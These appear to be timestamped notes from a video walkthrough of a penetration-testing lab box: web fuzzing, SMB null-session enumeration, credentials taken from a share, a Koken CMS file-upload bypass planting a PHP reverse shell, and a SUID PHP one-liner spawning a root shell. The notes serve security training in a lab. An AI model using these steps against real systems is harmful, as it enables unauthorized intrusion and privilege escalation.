

Web Enumeration (Ports 80, 8000)
Wfuzz for File Fuzzing [03:22]

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 "$URL_FUZZ"

-c: Use colorized output.

-z file,...: Specifies the wordlist for fuzzing.

--hc 404: Hides HTTP 404 (Not Found) responses.

"$URL_FUZZ": Uses the exported URL with FUZZ keyword.

Lesson: Fuzzing for files can reveal hidden resources like index.html.old [04:38].

Lesson: To handle unexpected 302 redirects with zero-byte responses, you can filter them out: --hc 404,302 --hh 0 [13:48].

Nikto Scan [04:06]

nikto --host "$URL" -C all

--host "$URL": Specifies the target URL.

-C all: Runs all checks.

Lesson: Nikto can be resource-intensive; consider stakeholder communication and traffic limits for real engagements [06:38].

Wfuzz for Directory Fuzzing [07:29]

export URL="http://<target_IP>:80/" (add trailing slash for directories)

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 "$URL_FUZZ"

Lesson: Directory fuzzing is crucial for uncovering administrative panels or other sensitive directories (e.g., /admin) [15:59].


SMB Enumeration (Ports 139, 445)
Enum4linux for SMB Information Gathering [17:44]

enum4linux -a $IP

-a: Performs all simple enumeration.

Lesson: enum4linux can identify SMB shares and often reveal null sessions, which can lead to sensitive file exposure [18:05].

SMB Client to Access Shares [18:42]

smbclient //$IP/sambashare -N

//$IP/sambashare: Specifies the target share.

-N: Connects with a null session.

dir: Lists contents of the share.

get <filename>: Downloads a file from the share. (e.g., get mailsent.txt, get wordpress.bkp.zip) [19:33]

Lesson: Look for sensitive files like mailsent.txt which can contain credentials, usernames, or clues [19:50]. (Username daisa@photographer.com and password babygirl were found.)



Authenticated Access and Exploitation
Login to Koken CMS Admin Panel [23:22]

Navigate to http://<target_IP>:8000/admin

Use found credentials: Email: daisa@photographer.com, Password: babygirl [24:25]

Searchsploit for Koken CMS Vulnerabilities [27:22]

searchsploit koken

Identified Exploit: Koken CMS 0.22.24 Arbitrary File Upload (Authenticated) [27:28]

This exploit suggests creating a malicious PHP file, saving it as .php.jpeg, uploading it via the Koken library, and then sending the request through Burp Suite to rename it to .php.

Creating a PHP Reverse Shell [29:28]

Modify a PHP reverse shell script (e.g., from PentestMonkey) to include your attack machine's IP and a listening port (e.g., 9090).

atom php-reverse-shell.php

cp php-reverse-shell.php offsec.php.jpeg (Rename for upload bypass) [30:15]

Upload and Intercept with Burp Suite [26:38]

Configure Firefox proxy settings to Burp Suite.

Go to Koken Admin Panel -> Library -> Import [26:19].

Browse and upload offsec.php.jpeg.

Intercept the request in Burp Suite [31:06].

Send to Repeater [31:08].

In Repeater, change the filename from .php.jpeg to just .php in the Content-Disposition header [31:23].

Forward the modified request.

Lesson: File upload vulnerabilities, especially when combined with authentication and renaming tricks, are powerful for initial access [51:26].


Post-Exploitation Enumeration (Initial Checks)

System info: file /bin/bash [34:51], uname -a [35:27], cat /etc/os-release [35:45]

Sudo permissions: sudo -l (requires password, unlikely for www-data) [36:04]

Environment variables: env [36:39]

Web root content: ls -la /var/www/html/koken [36:49]

World-writable directories: ls -la /var/tmp, ls -la /tmp, ls -la /dev/shm [37:34]

Mounts and fstab: cat /etc/fstab, mount [37:44]

Sensitive files in /etc: ls -la /etc (look for non-root permissions) [38:25]

Cron jobs: ls -la /etc/cron* [39:07], crontab -l (for current user), crontab -u root -l (requires root) [39:45]

Running processes as root: ps aux | grep -i 'root' --color=auto [40:14]

Network status: netstat -tunlp (look for internal services on 127.0.0.1) [41:36]

Home directories: ls -la /home (check for other users like agi) [42:34]


Privilege Escalation via SUID Binary (PHP 7.2) [44:48]

Identify SUID binaries: find / -perm -u=s -type f 2>/dev/null [44:53] (Identified /usr/bin/php7.2)

Check GTFOBins: Consult gtfobins.github.io for php SUID exploits [46:26].

Execute PHP SUID Exploit: From /usr/bin, execute the following:
./php7.2 -r 'pcntl_exec("/bin/sh", ["-p"]);' [48:09]

This command leverages the SUID bit on PHP to execute /bin/sh with the effective privileges of the PHP binary owner (root).




